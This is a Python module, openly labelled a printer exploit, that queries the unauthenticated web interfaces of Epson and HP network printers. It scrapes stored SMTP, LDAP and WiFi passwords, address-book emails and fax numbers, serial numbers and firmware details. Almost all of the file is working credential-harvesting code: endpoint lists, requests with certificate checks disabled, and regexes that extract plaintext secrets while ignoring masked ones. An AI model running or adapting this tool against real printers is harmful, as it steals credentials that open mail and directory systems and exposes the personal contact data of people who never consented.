"""Printer exploit module — scrape credentials and data from network printers.

Targets Epson, HP, Brother, Canon printers with unauthenticated web interfaces.
Extracts:
- SMTP/email credentials (stored for scan-to-email)
- LDAP credentials (stored for address book lookups)
- Address books (email addresses, fax numbers)
- WiFi configuration (SSID, sometimes PSK)
- Firmware version and serial numbers
- Print job history
"""

import re
from dataclasses import dataclass, field
from typing import Optional

import httpx


@dataclass
class PrinterCredentials:
    """Extracted credentials from a printer."""
    ip: str
    printer_model: str = ""
    serial_number: str = ""
    firmware: str = ""
    mac_address: str = ""
    # SMTP
    smtp_server: str = ""
    smtp_port: str = ""
    smtp_username: str = ""
    smtp_password: str = ""
    smtp_sender: str = ""
    # LDAP
    ldap_server: str = ""
    ldap_port: str = ""
    ldap_username: str = ""
    ldap_password: str = ""
    ldap_base_dn: str = ""
    # WiFi
    wifi_ssid: str = ""
    wifi_password: str = ""
    wifi_security: str = ""
    # Data
    address_book: list[dict] = field(default_factory=list)
    raw_pages: dict[str, str] = field(default_factory=dict)


def exploit_epson(ip: str, timeout: float = 3.0) -> PrinterCredentials:
    """Exploit an Epson printer's web interface for stored credentials.

    Epson printers expose configuration at various endpoints without auth.
    """
    creds = PrinterCredentials(ip=ip)
    client = httpx.Client(timeout=timeout, verify=False, follow_redirects=True)

    # === Device Info ===
    _epson_device_info(client, ip, creds)

    # === SMTP/Email Settings ===
    _epson_smtp(client, ip, creds)

    # === Address Book ===
    _epson_address_book(client, ip, creds)

    # === WiFi Settings ===
    _epson_wifi(client, ip, creds)

    # === LDAP Settings ===
    _epson_ldap(client, ip, creds)

    client.close()
    return creds


def _epson_device_info(client: httpx.Client, ip: str, creds: PrinterCredentials):
    """Extract device info from Epson web interface."""
    urls = [
        f"http://{ip}/PRESENTATION/HTML/TOP/INDEX.HTML",
        f"http://{ip}/",
        f"http://{ip}/PRESENTATION/HTML/TOP/PRTINFO.HTML",
        f"http://{ip}/StatusMonitor",
    ]
    for url in urls:
        try:
            resp = client.get(url)
            if resp.status_code == 200:
                html = resp.text
                creds.raw_pages["info"] = html[:5000]

                # Model
                model = re.search(r"(WF-\d+|ET-\d+|L\d+|EcoTank|XP-\d+|WorkForce[^<\"]*)", html)
                if model:
                    creds.printer_model = model.group(1).strip()

                # Serial
                serial = re.search(r"(?:Serial|S/N|serial_no)[:\s]*([A-Z0-9]{8,})", html, re.IGNORECASE)
                if serial:
                    creds.serial_number = serial.group(1)

                # MAC
                mac = re.search(r"([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}", html)
                if mac:
                    creds.mac_address = mac.group(0)

                # Firmware
                fw = re.search(r"(?:Firmware|FW|Version)[:\s]*([\d.]+)", html, re.IGNORECASE)
                if fw:
                    creds.firmware = fw.group(1)

                if creds.printer_model:
                    break
        except Exception:
            continue


def _epson_smtp(client: httpx.Client, ip: str, creds: PrinterCredentials):
    """Extract SMTP credentials from Epson email configuration pages."""
    smtp_urls = [
        f"http://{ip}/PRESENTATION/HTML/TOP/SETUP/MAIL/mail.html",
        f"http://{ip}/network/email.html",
        f"http://{ip}/PRESENTATION/ADVANCED/MAIL/TOP",
        f"http://{ip}/wsd/email.cgi",
        f"http://{ip}/PRESENTATION/HTML/TOP/SETUP/MAIL/AUTHSET.HTML",
        # Epson EpsonNet Config
        f"http://{ip}/EPSONNET/email/smtp",
        f"http://{ip}/PRESENTATION/ADVANCED/INFO/TOP",
    ]

    for url in smtp_urls:
        try:
            resp = client.get(url)
            if resp.status_code == 200:
                html = resp.text
                creds.raw_pages["smtp_" + url.split("/")[-1]] = html[:5000]

                # SMTP server
                server = re.search(r'(?:smtp[_\s]?server|mail[_\s]?server|SMTP\sServer)["\s:=]*([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})', html, re.IGNORECASE)
                if server and not creds.smtp_server:
                    creds.smtp_server = server.group(1)

                # SMTP port
                port = re.search(r'(?:smtp[_\s]?port|mail[_\s]?port)["\s:=]*(\d{2,5})', html, re.IGNORECASE)
                if port and not creds.smtp_port:
                    creds.smtp_port = port.group(1)

                # Username/email
                user = re.search(r'(?:smtp[_\s]?user|mail[_\s]?user|auth[_\s]?user|login[_\s]?name)["\s:=]*([^\s"<>]+@[^\s"<>]+|[a-zA-Z0-9._-]+)', html, re.IGNORECASE)
                if user and not creds.smtp_username:
                    creds.smtp_username = user.group(1)

                # Sender email
                sender = re.search(r'(?:sender|from[_\s]?addr|mail[_\s]?from)["\s:=]*([^\s"<>]+@[^\s"<>]+)', html, re.IGNORECASE)
                if sender and not creds.smtp_sender:
                    creds.smtp_sender = sender.group(1)

                # Password (sometimes in hidden fields or value attributes)
                passwd = re.search(r'(?:smtp[_\s]?pass|mail[_\s]?pass|auth[_\s]?pass)["\s:=]*([^\s"<>]{3,})', html, re.IGNORECASE)
                if passwd and not creds.smtp_password:
                    val = passwd.group(1)
                    if val not in ("***", "****", "********", "password"):
                        creds.smtp_password = val

                # Also check input value fields
                passwd_input = re.search(r'name=["\']?(?:smtp_?pass|auth_?pass|password)["\']?\s+value=["\']([^"\']+)', html, re.IGNORECASE)
                if passwd_input and not creds.smtp_password:
                    val = passwd_input.group(1)
                    if val not in ("***", "****", "********"):
                        creds.smtp_password = val

        except Exception:
            continue


def _epson_address_book(client: httpx.Client, ip: str, creds: PrinterCredentials):
    """Extract address book entries (emails, fax numbers)."""
    addr_urls = [
        f"http://{ip}/PRESENTATION/HTML/TOP/SETUP/ADDRESSBOOK/addressbook.html",
        f"http://{ip}/PRESENTATION/ADVANCED/ADDBOOK/TOP",
        f"http://{ip}/wsd/contacts.cgi",
        f"http://{ip}/EPSONNET/contacts",
    ]

    for url in addr_urls:
        try:
            resp = client.get(url)
            if resp.status_code == 200:
                html = resp.text
                creds.raw_pages["addressbook"] = html[:10000]

                # Extract email addresses
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', html)
                for email in set(emails):
                    if email not in [e.get("email") for e in creds.address_book]:
                        creds.address_book.append({"email": email, "source": "addressbook"})

                # Extract fax numbers
                fax_numbers = re.findall(r'(?:fax|tel)["\s:=]*([+\d\s\-()]{7,})', html, re.IGNORECASE)
                for fax in set(fax_numbers):
                    creds.address_book.append({"fax": fax.strip(), "source": "addressbook"})

                if creds.address_book:
                    break
        except Exception:
            continue

    # Also try Epson CONTACTS API (JSON)
    try:
        resp = client.get(f"http://{ip}/PRESENTATION/CONTACTS/TOP")
        if resp.status_code == 200 and "application/json" in resp.headers.get("content-type", ""):
            data = resp.json()
            for entry in data if isinstance(data, list) else data.get("contacts", []):
                if isinstance(entry, dict):
                    creds.address_book.append(entry)
    except Exception:
        pass


def _epson_wifi(client: httpx.Client, ip: str, creds: PrinterCredentials):
    """Extract WiFi configuration."""
    wifi_urls = [
        f"http://{ip}/PRESENTATION/HTML/TOP/SETUP/WIRELESS/wireless.html",
        f"http://{ip}/PRESENTATION/ADVANCED/WIRELESS/TOP",
        f"http://{ip}/network/wireless.html",
        f"http://{ip}/wsd/wireless.cgi",
    ]

    for url in wifi_urls:
        try:
            resp = client.get(url)
            if resp.status_code == 200:
                html = resp.text
                creds.raw_pages["wifi"] = html[:5000]

                # SSID
                ssid = re.search(r'(?:SSID|ssid|network_name)["\s:=]*([^\s"<>]{2,32})', html, re.IGNORECASE)
                if ssid and not creds.wifi_ssid:
                    creds.wifi_ssid = ssid.group(1)

                # WiFi password (sometimes exposed in config pages)
                wpsk = re.search(r'(?:WPA[_\s]?PSK|passphrase|wifi[_\s]?pass|wpa[_\s]?key|network[_\s]?key)["\s:=]*([^\s"<>]{8,63})', html, re.IGNORECASE)
                if wpsk and not creds.wifi_password:
                    val = wpsk.group(1)
                    if val not in ("***", "****", "********"):
                        creds.wifi_password = val

                # Security type
                sec = re.search(r'(?:security|encryption|auth)["\s:=]*(WPA[23]?[-\s]?PSK|WEP|Open|WPA[23]?[-\s]?Enterprise)', html, re.IGNORECASE)
                if sec and not creds.wifi_security:
                    creds.wifi_security = sec.group(1)

                if creds.wifi_ssid:
                    break
        except Exception:
            continue


def _epson_ldap(client: httpx.Client, ip: str, creds: PrinterCredentials):
    """Extract LDAP configuration."""
    ldap_urls = [
        f"http://{ip}/PRESENTATION/HTML/TOP/SETUP/LDAP/ldap.html",
        f"http://{ip}/PRESENTATION/ADVANCED/LDAP/TOP",
        f"http://{ip}/network/ldap.html",
    ]

    for url in ldap_urls:
        try:
            resp = client.get(url)
            if resp.status_code == 200:
                html = resp.text
                creds.raw_pages["ldap"] = html[:5000]

                server = re.search(r'(?:ldap[_\s]?server|ldap[_\s]?host)["\s:=]*([a-zA-Z0-9.\-]+)', html, re.IGNORECASE)
                if server and not creds.ldap_server:
                    creds.ldap_server = server.group(1)

                port = re.search(r'(?:ldap[_\s]?port)["\s:=]*(\d+)', html, re.IGNORECASE)
                if port and not creds.ldap_port:
                    creds.ldap_port = port.group(1)

                user = re.search(r'(?:ldap[_\s]?user|bind[_\s]?dn|ldap[_\s]?login)["\s:=]*([^\s"<>]+)', html, re.IGNORECASE)
                if user and not creds.ldap_username:
                    creds.ldap_username = user.group(1)

                base = re.search(r'(?:base[_\s]?dn|search[_\s]?base)["\s:=]*([^\s"<>]+)', html, re.IGNORECASE)
                if base and not creds.ldap_base_dn:
                    creds.ldap_base_dn = base.group(1)

                passwd = re.search(r'(?:ldap[_\s]?pass|bind[_\s]?pass)["\s:=]*([^\s"<>]{3,})', html, re.IGNORECASE)
                if passwd and not creds.ldap_password:
                    val = passwd.group(1)
                    if val not in ("***", "****", "********"):
                        creds.ldap_password = val

                if creds.ldap_server:
                    break
        except Exception:
            continue


def exploit_hp(ip: str, timeout: float = 3.0) -> PrinterCredentials:
    """Exploit HP printer web interface."""
    creds = PrinterCredentials(ip=ip)
    client = httpx.Client(timeout=timeout, verify=False, follow_redirects=True)

    # HP EWS (Embedded Web Server) endpoints
    hp_urls = {
        "info": [f"http://{ip}/hp/device/info_device_status.html", f"http://{ip}/"],
        "smtp": [f"http://{ip}/hp/device/set_config_email.html", f"http://{ip}/email_server.htm"],
        "ldap": [f"http://{ip}/hp/device/set_config_ldap.html"],
        "wifi": [f"http://{ip}/hp/device/set_config_wireless.html"],
        "contacts": [f"http://{ip}/hp/device/set_config_speedDials.html"],
    }

    for category, urls in hp_urls.items():
        for url in urls:
            try:
                resp = client.get(url)
                if resp.status_code == 200:
                    html = resp.text
                    creds.raw_pages[category] = html[:5000]
                    _parse_generic_printer_page(html, creds, category)
                    break
            except Exception:
                continue

    client.close()
    return creds


def _parse_generic_printer_page(html: str, creds: PrinterCredentials, category: str):
    """Generic parser for printer config pages."""
    if category == "info":
        model = re.search(r"(HP\s+[A-Za-z0-9\s]+|LaserJet[^<\"]*|OfficeJet[^<\"]*)", html)
        if model:
            creds.printer_model = model.group(1).strip()
    elif category == "smtp":
        server = re.search(r'value=["\']([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["\']', html)
        if server:
            creds.smtp_server = server.group(1)
    elif category == "wifi":
        ssid = re.search(r'(?:SSID|ssid)["\s:=]*([^\s"<>]{2,32})', html)
        if ssid:
            creds.wifi_ssid = ssid.group(1)


def exploit_printer(ip: str, timeout: float = 3.0) -> PrinterCredentials:
    """Auto-detect printer type and run appropriate exploit.

    Tries Epson first (based on your network), then HP, then generic.
    """
    # Quick probe to detect printer type
    client = httpx.Client(timeout=timeout, verify=False, follow_redirects=True)
    try:
        resp = client.get(f"http://{ip}/")
        if resp.status_code == 200:
            html = resp.text.lower()
            if "epson" in html or "seiko" in html:
                client.close()
                return exploit_epson(ip, timeout)
            elif "hp" in html or "hewlett" in html:
                client.close()
                return exploit_hp(ip, timeout)
    except Exception:
        pass
    client.close()

    # Default to Epson (most common in your network)
    return exploit_epson(ip, timeout)
